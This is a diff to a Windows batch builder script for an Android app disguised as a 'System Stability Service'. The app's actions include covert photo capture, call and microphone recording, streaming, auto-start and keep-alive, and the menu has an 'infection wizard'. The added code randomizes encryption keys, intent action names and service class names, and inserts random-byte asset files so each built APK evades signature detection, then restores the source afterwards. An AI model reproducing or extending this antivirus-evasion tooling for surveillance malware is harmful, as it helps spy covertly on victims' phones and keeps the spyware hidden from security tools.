@@ -344,7 +344,7 @@ set /a RAND_MAJOR=%RANDOM% %% 4 + 1
 set /a RAND_MINOR=%RANDOM% %% 10
 set /a RAND_PATCH=%RANDOM% %% 10
 set "DEF_VER=!RAND_MAJOR!.!RAND_MINOR!.!RAND_PATCH!"
-set "DEF_SDK=26"
+set "DEF_SDK=21"
 
 REM App Name
 echo [95m[^>] Enter App Name [System Stability Service]:[0m
@@ -410,6 +410,74 @@ if not "!WEB_URL!"=="" (
 )
 
 echo.
+echo.
+
+REM --- DYNAMIC OBFUSCATION PROTOCOL ---
+echo [96m[*] Configuring Dynamic Obfuscation...[0m
+
+REM 1. Generate Dynamic Encryption Key
+powershell -Command "$k = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_}); echo $k" > temp_key.txt
+set /p RAND_KEY=<temp_key.txt
+del temp_key.txt
+
+set "LOCAL_PROPS=%PROJECT_DIR%\local.properties"
+powershell -Command "if (Test-Path '%LOCAL_PROPS%') { $content = Get-Content '%LOCAL_PROPS%'; if ($content -match 'ENCRYPTION_KEY=') { $content -replace 'ENCRYPTION_KEY=.*', 'ENCRYPTION_KEY=%RAND_KEY%' | Set-Content '%LOCAL_PROPS%' } else { Add-Content '%LOCAL_PROPS%' 'ENCRYPTION_KEY=%RAND_KEY%' } } else { Set-Content '%LOCAL_PROPS%' 'ENCRYPTION_KEY=%RAND_KEY%' }"
+
+REM 2. Add Binary Signature Entropy
+set "SYS_DIR=%PROJECT_DIR%\app\src\main\assets\sys"
+if not exist "%SYS_DIR%" mkdir "%SYS_DIR%"
+for /L %%i in (1,1,3) do (
+    powershell -Command "$data = New-Object Byte[] 512; (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($data); [System.IO.File]::WriteAllBytes('%SYS_DIR%\metadata_%%i.dat', $data)"
+)
+
+REM 3. Randomize Intent Actions in Constants.java
+set "CONSTANTS_JAVA=%PROJECT_DIR%\app\src\main\java\com\labs\labrats\Constants.java"
+set "MANIFEST=%PROJECT_DIR%\app\src\main\AndroidManifest.xml"
+powershell -Command "$prefix = 'com.labs.' + (-join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})); echo $prefix" > temp_prefix.txt
+set /p ACT_PREFIX=<temp_prefix.txt
+del temp_prefix.txt
+
+set "ACTION_FIELDS=ACTION_AUTO_START ACTION_KEEP_ALIVE ACTION_START_STREAM ACTION_STOP_STREAM ACTION_CAPTURE_PHOTO ACTION_START_RECORDING ACTION_STOP_RECORDING ACTION_STOP_OPTICS ACTION_START_CORE ACTION_STOP_CORE ACTION_START_CALL_REC ACTION_STOP_CALL_REC ACTION_START_MIC_REC ACTION_STOP_MIC_REC ACTION_CALL_STATE_CHANGED ACTION_UPDATE_AUDIO_SETTINGS ACTION_STOP_AUDIO ACTION_START_AUDIO"
+
+for %%F in (%ACTION_FIELDS%) do (
+    powershell -Command "$r = '%ACT_PREFIX%.' + (-join ((65..90) + (48..57) | Get-Random -Count 12 | ForEach-Object {[char]$_})); echo $r" > temp_act.txt
+    set /p RAND_ACTION=<temp_act.txt
+    del temp_act.txt
+
+    powershell -Command "(Get-Content '%CONSTANTS_JAVA%') -replace 'public static final String %%F = \".*\";', 'public static final String %%F = \"!RAND_ACTION!\";' | Set-Content '%CONSTANTS_JAVA%'"
+
+    if "%%F"=="ACTION_AUTO_START" (
+        powershell -Command "(Get-Content '%MANIFEST%') -replace 'com\.labs\.stability\.ST_P_01', '!RAND_ACTION!' | Set-Content '%MANIFEST%'"
+    )
+    if "%%F"=="ACTION_KEEP_ALIVE" (
+        powershell -Command "(Get-Content '%MANIFEST%') -replace 'com\.labs\.stability\.ST_P_02', '!RAND_ACTION!' | Set-Content '%MANIFEST%'"
+    )
+)
+
+REM 4. Service/Receiver Randomization
+powershell -Command "$p = -join ((97..122) | Get-Random -Count 4 | ForEach-Object {[char]$_}); echo $p" > temp_p.txt
+set /p PREFIX=<temp_p.txt
+del temp_p.txt
+
+set "ENTITIES=WorkManager_Sync Analytics_Provider MediaFrameworkService StatusNotification IO_Persistence_Manager TelephonyState SystemBoot InstallReferrerReceiver"
+set "MAPPING_FILE=%SCRIPT_DIR%build_mapping.txt"
+if exist "%MAPPING_FILE%" del "%MAPPING_FILE%"
+
+for %%E in (%ENTITIES%) do (
+    powershell -Command "$r = '%PREFIX%_' + (-join ((97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})); echo $r" > temp_r.txt
+    set /p RAND_NAME=<temp_r.txt
+    del temp_r.txt
+
+    echo %%E:!RAND_NAME!>> "%MAPPING_FILE%"
+
+    REM Update Manifest
+    powershell -Command "(Get-Content '%MANIFEST%') -replace '\.%%E', '.!RAND_NAME!' | Set-Content '%MANIFEST%'"
+
+    REM Update all Java files and rename
+    powershell -Command "$ents = Get-ChildItem -Path '%PROJECT_DIR%\app\src\main\java' -Filter '*.java' -Recurse; foreach($f in $ents) { (Get-Content $f.FullName) -replace '\b%%E\b', '!RAND_NAME!' | Set-Content $f.FullName }"
+    powershell -Command "$f = Get-ChildItem -Path '%PROJECT_DIR%\app\src\main\java' -Filter '%%E.java' -Recurse; if($f) { Rename-Item $f.FullName -NewName '!RAND_NAME!.java' }"
+)
+
 goto :eof
 
 :build_apk
@@ -532,6 +600,25 @@ if exist "!UNSIGNED_APK!" (
     echo     [91m[!] Unsigned APK generation failed. Check build_log.txt[0m
 )
 
+REM Revert obfuscation mapping to restore source for next build or editing
+set "MAPPING_FILE=%SCRIPT_DIR%build_mapping.txt"
+if exist "%MAPPING_FILE%" (
+    echo [96m[*] Restoring source tree...[0m
+    set "MANIFEST=%PROJECT_DIR%\app\src\main\AndroidManifest.xml"
+    for /f "tokens=1,2 delims=:" %%a in (%MAPPING_FILE%) do (
+        set "ENTITY=%%a"
+        set "RAND=%%b"
+
+        REM Update Manifest
+        powershell -Command "(Get-Content '!MANIFEST!') -replace '\.!RAND!', '.!ENTITY!' | Set-Content '!MANIFEST!'"
+
+        REM Update all Java files and rename back
+        powershell -Command "$ents = Get-ChildItem -Path '%PROJECT_DIR%\app\src\main\java' -Filter '*.java' -Recurse; foreach($f in $ents) { (Get-Content $f.FullName) -replace '\b!RAND!\b', '!ENTITY!' | Set-Content $f.FullName }"
+        powershell -Command "$f = Get-ChildItem -Path '%PROJECT_DIR%\app\src\main\java' -Filter '!RAND!.java' -Recurse; if($f) { Rename-Item $f.FullName -NewName '!ENTITY!.java' }"
+    )
+    del "%MAPPING_FILE%"
+)
+
 if "!APK_FOUND!"=="0" (
     echo.
     echo [91m╔══════════════════════════════════════════════════════════════╗[0m
@@ -573,12 +660,14 @@ echo.
 
 if "!MENU_OPTION!"=="1" (
     call :check_requirements
+    if %errorlevel% neq 0 exit /b 1
     call :generate_keystore
     call :configure_logo
     call :configure_app
     call :build_apk
 ) else if "!MENU_OPTION!"=="2" (
     call :check_requirements
+    if %errorlevel% neq 0 exit /b 1
     call :generate_keystore
 ) else if "!MENU_OPTION!"=="3" (
     call :configure_logo
@@ -587,6 +676,9 @@ if "!MENU_OPTION!"=="1" (
 ) else if "!MENU_OPTION!"=="5" (
     call :check_requirements
     call :show_manual_java_install
+    echo.
+    echo [93mPress any key to return to menu...[0m
+    pause >nul
 ) else if "!MENU_OPTION!"=="6" (
     call :infection_wizard
 ) else if "!MENU_OPTION!"=="7" (
